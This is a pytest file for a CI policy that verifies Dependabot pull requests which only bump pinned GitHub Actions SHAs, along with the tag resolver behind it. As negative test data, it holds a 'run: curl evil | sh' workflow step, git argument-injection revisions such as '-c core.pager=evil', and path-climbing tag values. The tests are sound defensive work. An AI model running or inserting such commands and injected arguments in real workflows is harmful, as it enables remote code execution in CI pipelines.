"""The dependabot github_actions exemption: actions_pin_bump_verified and its
use in check_merge_rights, codex_review_skip_allowed and `check-pr`."""

import json
import subprocess

import pytest

from scripts.marketplace_ci.__main__ import main
from scripts.marketplace_ci.pr_policy import (
    actions_pin_bump_verified,
    check_merge_rights,
    codex_review_skip_allowed,
    resolve_action_tag_sha,
)

OLD = "a" * 40
NEW = "b" * 40
FORK = "c" * 40
WF = ".github/workflows/ci.yml"


def _line(sha, tag, *, action="actions/labeler", indent="      ", dash="", quote=""):
    return f"{indent}{dash}uses: {quote}{action}@{sha}{quote} # ratchet:{action}@{tag}"


def _workflow(*uses_lines):
    body = "\n".join(uses_lines)
    return f"name: ci\non: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n{body}\n"


def _commit(git_repo, files, message):
    for path, content in files.items():
        git_repo.stage(path, content)
    subprocess.run(["git", "commit", "-q", "-m", message], cwd=git_repo.root, check=True)
    return subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=git_repo.root, capture_output=True, text=True, check=True
    ).stdout.strip()


class _tags:
    """A fake tag resolver that records each lookup."""

    def __init__(self, mapping):
        self.mapping = mapping
        self.calls = []

    def __call__(self, owner_repo, tag):
        self.calls.append((owner_repo, tag))
        return self.mapping.get((owner_repo, tag))


GOOD_TAGS = {("actions/labeler", "v7.0.0"): NEW, ("actions/checkout", "v7.0.2"): NEW}


def _bump(git_repo, base_files, head_files):
    base = _commit(git_repo, base_files, "base")
    head = _commit(git_repo, head_files, "bump")
    return base, head


def test_genuine_pin_bump_passes(git_repo):
    base, head = _bump(
        git_repo,
        {WF: _workflow(_line(OLD, "v6.0.1"), _line(OLD, "v6.0.1", dash="- "))},
        {WF: _workflow(_line(NEW, "v7.0.0"), _line(NEW, "v7.0.0", dash="- "))},
    )
    resolve = _tags(GOOD_TAGS)
    assert actions_pin_bump_verified(git_repo.root, base, head, [WF], resolve_tag=resolve)
    assert resolve.calls == [("actions/labeler", "v7.0.0")]  # cached per tag


@pytest.mark.parametrize("quote", ["'", '"'])
def test_quoted_pin_and_composite_action_pass(git_repo, quote):
    composite = ".github/actions/setup/action.yml"
    base, head = _bump(
        git_repo,
        {WF: _workflow(_line(OLD, "v6.0.1", quote=quote)), composite: _line(OLD, "v6.0.1") + "\n"},
        {WF: _workflow(_line(NEW, "v7.0.0", quote=quote)), composite: _line(NEW, "v7.0.0") + "\n"},
    )
    assert actions_pin_bump_verified(
        git_repo.root, base, head, [composite, WF], resolve_tag=_tags(GOOD_TAGS)
    )


def test_sub_path_action_resolves_against_its_repository(git_repo):
    action = "github/codeql-action/init"
    base, head = _bump(
        git_repo,
        {WF: _workflow(_line(OLD, "v3.1", action=action))},
        {WF: _workflow(_line(NEW, "v3.2", action=action))},
    )
    resolve = _tags({("github/codeql-action", "v3.2"): NEW})
    assert actions_pin_bump_verified(git_repo.root, base, head, [WF], resolve_tag=resolve)


@pytest.mark.parametrize(
    "new_line",
    [
        # SHA that the tag does not name (e.g. a commit only in a fork)
        _line(FORK, "v7.0.0"),
        # tag that does not resolve at all
        _line(NEW, "v9.9.9"),
        # a different action swapped in
        _line(NEW, "v7.0.2", action="actions/checkout"),
        # ratchet comment naming another action than the pin
        f"      uses: actions/labeler@{NEW} # ratchet:actions/checkout@v7.0.2",
        # same, with a tag that does resolve to the pinned SHA for the pin's action
        f"      uses: actions/labeler@{NEW} # ratchet:actions/checkout@v7.0.0",
        # indentation or list-item shape changed
        _line(NEW, "v7.0.0", indent="        "),
        _line(NEW, "v7.0.0", dash="- "),
        _line(NEW, "v7.0.0", quote="'"),
        # trailing content, missing ratchet comment, a tag ref instead of a SHA
        _line(NEW, "v7.0.0") + " extra",
        f"      uses: actions/labeler@{NEW}",
        "      uses: actions/labeler@v7.0.0 # ratchet:actions/labeler@v7.0.0",
        # a local action or docker image
        "      uses: ./.github/actions/evil",
        # a `run:` step instead
        "      run: curl evil | sh",
    ],
)
def test_anything_but_a_verified_same_action_pin_swap_fails(git_repo, new_line):
    base, head = _bump(git_repo, {WF: _workflow(_line(OLD, "v6.0.1"))}, {WF: _workflow(new_line)})
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


def test_an_added_line_next_to_a_good_pin_fails(git_repo):
    base, head = _bump(
        git_repo,
        {WF: _workflow(_line(OLD, "v6.0.1"))},
        {WF: _workflow(_line(NEW, "v7.0.0"), "      - run: echo hi")},
    )
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


def test_a_changed_permissions_line_fails(git_repo):
    base, head = _bump(
        git_repo,
        {WF: "permissions: read-all\n" + _workflow(_line(OLD, "v6.0.1"))},
        {WF: "permissions: write-all\n" + _workflow(_line(NEW, "v7.0.0"))},
    )
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


def test_old_line_must_be_a_pin_too(git_repo):
    base, head = _bump(
        git_repo,
        {WF: _workflow("      - run: echo hi")},
        {WF: _workflow(_line(NEW, "v7.0.0"))},
    )
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


@pytest.mark.parametrize(
    "paths",
    [
        [],
        ["uv.lock"],
        [WF, "uv.lock"],
        [".github/dependabot.yml"],
        [".github/workflows/sub/ci.yml"],
        [".github/actions/setup/run.sh"],
        [".github/workflows/ci.yml.bak"],
    ],
)
def test_paths_outside_workflow_and_action_files_fail_before_any_git_call(paths, tmp_path):
    # tmp_path is not a git repository: reaching git would also fail, but the
    # path check must refuse first without resolving anything.
    resolve = _tags(GOOD_TAGS)
    assert not actions_pin_bump_verified(tmp_path, OLD, NEW, paths, resolve_tag=resolve)
    assert resolve.calls == []


def test_added_workflow_file_fails(git_repo):
    base = _commit(git_repo, {"README.md": "x"}, "base")
    head = _commit(git_repo, {WF: _workflow(_line(NEW, "v7.0.0"))}, "add")
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


def test_mode_change_fails(git_repo):
    base = _commit(git_repo, {WF: _workflow(_line(OLD, "v6.0.1"))}, "base")
    git_repo.stage(WF, _workflow(_line(NEW, "v7.0.0")))
    subprocess.run(["git", "update-index", "--chmod=+x", WF], cwd=git_repo.root, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "bump"], cwd=git_repo.root, check=True)
    head = subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=git_repo.root, capture_output=True, text=True, check=True
    ).stdout.strip()
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


def test_changed_paths_must_match_the_diff(git_repo):
    other = ".github/workflows/other.yml"
    base, head = _bump(
        git_repo,
        {WF: _workflow(_line(OLD, "v6.0.1")), other: _workflow(_line(OLD, "v6.0.1"))},
        {WF: _workflow(_line(NEW, "v7.0.0")), other: _workflow("      - run: evil")},
    )
    # A caller listing only WF must not get a pass for a diff that changes more.
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


def test_unchanged_diff_and_git_error_fail(git_repo):
    base = _commit(git_repo, {WF: _workflow(_line(OLD, "v6.0.1"))}, "base")
    assert not actions_pin_bump_verified(
        git_repo.root, base, base, [WF], resolve_tag=_tags(GOOD_TAGS)
    )
    assert not actions_pin_bump_verified(
        git_repo.root, "0" * 40, base, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


# --- the policy functions -------------------------------------------------


class _Api:
    def __init__(self, user):
        self.user = user
        self.owner = "andre"

    def collaborator_permission(self, username):
        return None

    def codeowners(self):
        return (("*", ("@andre",)),)


def test_merge_rights_accept_verified_pin_bump_from_trusted_bot():
    result = check_merge_rights(
        _Api("dependabot[bot]"), [WF], bot_commits_verified=True, actions_pins_verified=True
    )
    assert result.allowed
    assert result.reason is not None
    assert "actions pin bump" in result.reason


@pytest.mark.parametrize(
    ("user", "commits", "pins"),
    [
        ("dependabot[bot]", True, False),
        ("dependabot[bot]", False, True),
        ("someone", True, True),
    ],
)
def test_merge_rights_pin_exemption_needs_all_three(user, commits, pins):
    result = check_merge_rights(
        _Api(user), [WF], bot_commits_verified=commits, actions_pins_verified=pins
    )
    assert not result.allowed


def test_merge_rights_pin_exemption_never_applies_to_an_empty_diff():
    result = check_merge_rights(
        _Api("dependabot[bot]"), [], bot_commits_verified=True, actions_pins_verified=True
    )
    assert not result.allowed


@pytest.mark.parametrize(
    ("user", "paths", "commits", "pins", "expected"),
    [
        ("dependabot[bot]", [WF], True, True, True),
        ("dependabot[bot]", [WF], True, False, False),
        ("dependabot[bot]", [WF], False, True, False),
        ("someone", [WF], True, True, False),
        ("dependabot[bot]", [], True, True, False),
    ],
)
def test_codex_skip_follows_the_pin_exemption(user, paths, commits, pins, expected):
    assert (
        codex_review_skip_allowed(
            user, paths, bot_commits_verified=commits, actions_pins_verified=pins
        )
        is expected
    )


# --- resolve_action_tag_sha ----------------------------------------------


def _fake_gh(monkeypatch, responses):
    seen = []

    def fake_run(cmd, **kwargs):
        seen.append(cmd)
        path = cmd[-1]
        if path not in responses:
            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr="404")
        return subprocess.CompletedProcess(cmd, 0, stdout=json.dumps(responses[path]), stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)
    return seen


def test_resolve_lightweight_tag(monkeypatch):
    seen = _fake_gh(
        monkeypatch,
        {
            "repos/o/r/git/ref/tags/v1": {
                "ref": "refs/tags/v1",
                "object": {"type": "commit", "sha": NEW},
            }
        },
    )
    assert resolve_action_tag_sha("o/r", "v1") == NEW
    assert seen == [["gh", "api", "--method", "GET", "repos/o/r/git/ref/tags/v1"]]


def test_resolve_annotated_tag_is_peeled(monkeypatch):
    tag_obj = "d" * 40
    _fake_gh(
        monkeypatch,
        {
            "repos/o/r/git/ref/tags/v1": {
                "ref": "refs/tags/v1",
                "object": {"type": "tag", "sha": tag_obj},
            },
            f"repos/o/r/git/tags/{tag_obj}": {"object": {"type": "commit", "sha": NEW}},
        },
    )
    assert resolve_action_tag_sha("o/r", "v1") == NEW


@pytest.mark.parametrize(
    "answer",
    [
        {"ref": "refs/tags/v10", "object": {"type": "commit", "sha": NEW}},
        {"ref": "refs/tags/v1", "object": {"type": "commit", "sha": "short"}},
        {"ref": "refs/tags/v1", "object": {"type": "tree", "sha": NEW}},
        {"ref": "refs/tags/v1", "object": {"type": "tag", "sha": "d" * 40}},
        {"ref": "refs/tags/v1"},
        [],
    ],
)
def test_resolve_fails_closed_on_unexpected_answers(monkeypatch, answer):
    _fake_gh(monkeypatch, {"repos/o/r/git/ref/tags/v1": answer})
    assert resolve_action_tag_sha("o/r", "v1") is None


def test_resolve_fails_closed_on_api_error(monkeypatch):
    _fake_gh(monkeypatch, {})
    assert resolve_action_tag_sha("o/r", "v1") is None


def test_resolve_fails_closed_on_timeout(monkeypatch):
    timeouts = []

    def hanging_run(cmd, **kwargs):
        timeouts.append(kwargs.get("timeout"))
        raise subprocess.TimeoutExpired(cmd, 30.0)

    monkeypatch.setattr(subprocess, "run", hanging_run)
    assert resolve_action_tag_sha("o/r", "v1") is None
    # The call must carry a finite timeout, or a hung gh would block until the job times out.
    assert len(timeouts) == 1
    assert isinstance(timeouts[0], (int, float))
    assert timeouts[0] > 0


def test_resolve_fails_closed_when_gh_cannot_start(monkeypatch):
    def missing_gh(cmd, **kwargs):
        raise FileNotFoundError(2, "No such file or directory", cmd[0])

    monkeypatch.setattr(subprocess, "run", missing_gh)
    assert resolve_action_tag_sha("o/r", "v1") is None


@pytest.mark.parametrize(
    "error",
    [subprocess.TimeoutExpired(["git"], 60.0), FileNotFoundError(2, "No such file", "git")],
)
def test_git_diff_timeout_or_start_failure_fails_closed(monkeypatch, tmp_path, error):
    timeouts = []

    def failing_git(cmd, **kwargs):
        timeouts.append(kwargs.get("timeout"))
        raise error

    monkeypatch.setattr(subprocess, "run", failing_git)
    resolve = _tags(GOOD_TAGS)
    assert not actions_pin_bump_verified(tmp_path, OLD, NEW, [WF], resolve_tag=resolve)
    assert resolve.calls == []
    # The first git call must carry a finite timeout of its own.
    assert len(timeouts) == 1
    assert isinstance(timeouts[0], (int, float))
    assert timeouts[0] > 0


def test_content_diff_has_a_timeout_and_literal_pathspecs(monkeypatch, git_repo):
    base, head = _bump(
        git_repo, {WF: _workflow(_line(OLD, "v6.0.1"))}, {WF: _workflow(_line(NEW, "v7.0.0"))}
    )
    real_run = subprocess.run
    calls = []

    def recording_run(cmd, **kwargs):
        calls.append((cmd, kwargs.get("timeout")))
        return real_run(cmd, **kwargs)

    monkeypatch.setattr(subprocess, "run", recording_run)
    assert actions_pin_bump_verified(git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS))
    content_diff = [cmd for cmd, _ in calls if "-U0" in cmd]
    assert len(content_diff) == 1
    assert content_diff[0][:3] == ["git", "--literal-pathspecs", "diff"]
    assert all(isinstance(t, (int, float)) and t > 0 for _, t in calls)


def test_resolve_fails_closed_on_undecodable_output(monkeypatch):
    def bad_bytes(cmd, **kwargs):
        raise UnicodeDecodeError("utf-8", b"\xff", 0, 1, "invalid start byte")

    monkeypatch.setattr(subprocess, "run", bad_bytes)
    assert resolve_action_tag_sha("o/r", "v1") is None


def test_every_listed_file_needs_its_own_checked_hunk(monkeypatch, tmp_path):
    other = ".github/workflows/other.yml"
    name_status = b"M\0" + WF.encode() + b"\0M\0" + other.encode() + b"\0"
    content = (
        f"diff --git a/{WF} b/{WF}\n--- a/{WF}\n+++ b/{WF}\n@@ -7 +7 @@\n"
        f"-{_line(OLD, 'v6.0.1')}\n+{_line(NEW, 'v7.0.0')}\n"
    ).encode()

    def fake_git(cmd, **kwargs):
        out = name_status if "--name-status" in cmd else content
        return subprocess.CompletedProcess(cmd, 0, stdout=out, stderr=b"")

    monkeypatch.setattr(subprocess, "run", fake_git)
    # other.yml is listed as modified but yields no hunk: it must not pass on WF's hunk alone.
    assert not actions_pin_bump_verified(
        tmp_path, OLD, NEW, [WF, other], resolve_tag=_tags(GOOD_TAGS)
    )
    # The same output with only WF listed passes, so the refusal above is the coverage check.
    name_status = b"M\0" + WF.encode() + b"\0"
    assert actions_pin_bump_verified(tmp_path, OLD, NEW, [WF], resolve_tag=_tags(GOOD_TAGS))


def test_workflow_name_with_a_space_still_passes(git_repo):
    spaced = ".github/workflows/my ci.yml"
    base = _commit_bytes(git_repo, {spaced: _workflow(_line(OLD, "v6.0.1")).encode()}, "base")
    head = _commit_bytes(git_repo, {spaced: _workflow(_line(NEW, "v7.0.0")).encode()}, "bump")
    assert actions_pin_bump_verified(
        git_repo.root, base, head, [spaced], resolve_tag=_tags(GOOD_TAGS)
    )


def test_glob_named_workflow_file_is_still_content_checked(git_repo):
    evil = ".github/workflows/[a].yml"
    base = _commit_bytes(
        git_repo,
        {
            WF: _workflow(_line(OLD, "v6.0.1")).encode(),
            evil: _workflow("      - run: echo ok").encode(),
        },
        "base",
    )
    head = _commit_bytes(
        git_repo,
        {
            WF: _workflow(_line(NEW, "v7.0.0")).encode(),
            evil: _workflow("      - run: evil").encode(),
        },
        "bump",
    )
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [evil, WF], resolve_tag=_tags(GOOD_TAGS)
    )


@pytest.mark.parametrize(("owner_repo", "tag"), [("o/..", "v1"), ("o/r", ".."), ("o/r", "a..b")])
def test_resolve_refuses_path_climbing_segments(monkeypatch, owner_repo, tag):
    seen = _fake_gh(monkeypatch, {})
    assert resolve_action_tag_sha(owner_repo, tag) is None
    assert seen == []


# --- check-pr end to end --------------------------------------------------


@pytest.mark.parametrize(
    ("verified", "tag_sha", "rc", "skip"),
    [
        (True, NEW, 0, "true"),
        (True, FORK, 1, "false"),
        (False, NEW, 1, "false"),
    ],
)
def test_check_pr_actions_pin_bump(monkeypatch, git_repo, tmp_path, verified, tag_sha, rc, skip):
    base = _commit(git_repo, {WF: _workflow(_line(OLD, "v6.0.1"))}, "base")
    head = _commit(git_repo, {WF: _workflow(_line(NEW, "v7.0.0"))}, "bump")
    template = git_repo.root / ".github" / "pull_request_template.md"
    template.write_text("## Summary\n\n## Checklist\n", encoding="utf-8")
    (git_repo.root / "CODEOWNERS").write_text("* @andre\n", encoding="utf-8")
    event = {
        "pull_request": {
            "title": "chore(deps): bump actions/labeler from 6.0.1 to 7.0.0",
            "body": "## Summary\n\nBump.\n",
            "number": 5,
            "commits": 1,
            "user": {"login": "dependabot[bot]"},
            "base": {
                "repo": {"owner": {"login": "andre"}, "full_name": "andre/repo"},
                "sha": base,
            },
            "head": {"sha": head},
        }
    }
    event_path = tmp_path / "event.json"
    event_path.write_text(json.dumps(event), encoding="utf-8")
    monkeypatch.setattr(
        "scripts.marketplace_ci.pr_policy.commits_verified_from_trusted_bot",
        lambda *args: verified,
    )
    monkeypatch.setattr(
        "scripts.marketplace_ci.pr_policy.resolve_action_tag_sha", lambda repo, tag: tag_sha
    )
    monkeypatch.chdir(git_repo.root)
    out = tmp_path / "github_output"
    args = ["check-pr", "--event", str(event_path), "--codex-review-skip-output", str(out)]
    assert main(args) == rc
    assert out.read_text(encoding="utf-8") == f"skip_codex_review={skip}\n"


def _commit_bytes(git_repo, files, message):
    for path, data in files.items():
        target = git_repo.root / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(data)
        subprocess.run(["git", "add", "--", path], cwd=git_repo.root, check=True)
    subprocess.run(["git", "commit", "-q", "-m", message], cwd=git_repo.root, check=True)
    return subprocess.run(
        ["git", "rev-parse", "HEAD"], cwd=git_repo.root, capture_output=True, text=True, check=True
    ).stdout.strip()


@pytest.mark.parametrize(
    ("path", "old", "new"),
    [
        # CRLF line endings keep a trailing carriage return on the diff line
        (
            WF,
            _workflow(_line(OLD, "v6.0.1")).replace("\n", "\r\n"),
            _workflow(_line(NEW, "v7.0.0")).replace("\n", "\r\n"),
        ),
        # the pin is the last line with no newline: git adds a marker line
        (
            WF,
            _workflow(_line(OLD, "v6.0.1")).rstrip("\n"),
            _workflow(_line(NEW, "v7.0.0")).rstrip("\n"),
        ),
        # a control character in the file name makes git C-quote the header
        (
            ".github/workflows/a\tb.yml",
            _workflow(_line(OLD, "v6.0.1")),
            _workflow(_line(NEW, "v7.0.0")),
        ),
    ],
)
def test_diff_output_quirks_fail_closed(git_repo, path, old, new):
    base = _commit_bytes(git_repo, {path: old.encode()}, "base")
    head = _commit_bytes(git_repo, {path: new.encode()}, "bump")
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [path], resolve_tag=_tags(GOOD_TAGS)
    )


def test_non_utf8_diff_fails_closed(git_repo):
    old = _workflow(_line(OLD, "v6.0.1")).encode() + b"# \xff\n"
    new = _workflow(_line(NEW, "v7.0.0")).encode() + b"# \xfe\n"
    base = _commit_bytes(git_repo, {WF: old}, "base")
    head = _commit_bytes(git_repo, {WF: new}, "bump")
    assert not actions_pin_bump_verified(
        git_repo.root, base, head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )


@pytest.mark.parametrize(
    ("base", "head"),
    [
        ("--output=/tmp/x", NEW),
        (OLD, "-c core.pager=evil"),
        ("HEAD~1", NEW),
        (OLD, NEW.upper()),
        (OLD[:39], NEW),
    ],
)
def test_non_sha_revisions_fail_before_any_git_call(tmp_path, base, head):
    # tmp_path is not a repository: reaching git would fail too, but the SHA
    # check must refuse first and resolve nothing.
    resolve = _tags(GOOD_TAGS)
    assert not actions_pin_bump_verified(tmp_path, base, head, [WF], resolve_tag=resolve)
    assert resolve.calls == []


def test_symbolic_revision_is_refused_even_when_git_would_resolve_it(git_repo):
    base, head = _bump(
        git_repo, {WF: _workflow(_line(OLD, "v6.0.1"))}, {WF: _workflow(_line(NEW, "v7.0.0"))}
    )
    resolve = _tags(GOOD_TAGS)
    assert actions_pin_bump_verified(git_repo.root, base, head, [WF], resolve_tag=resolve)
    assert not actions_pin_bump_verified(
        git_repo.root, "HEAD~1", head, [WF], resolve_tag=_tags(GOOD_TAGS)
    )
